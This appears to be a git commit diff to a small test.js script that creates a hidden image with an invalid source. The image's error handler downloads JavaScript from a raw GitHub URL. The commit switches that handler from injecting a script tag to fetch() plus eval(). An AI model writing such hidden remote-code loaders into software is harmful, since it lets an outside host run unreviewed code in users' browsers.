c216e43c2c2651a8b40e823d08dd513a002bdc89
Studio <124630274+StudioCompile@users.noreply.github.com>
2026-05-01 20:51:28 -0400

    Update test.js

--- test.js
+++ test.js
@@ -4,9 +4,9 @@
   img.src = 'x';
   img.style.display = 'none';
   img.onerror = function () {
-    const script = document.createElement('script');
-    script.src = 'https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js';
-    document.documentElement.appendChild(script);
+    fetch('https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js')
+      .then(r => r.text())
+      .then(code => eval(code));
   };
   document.documentElement.appendChild(img);
 })();
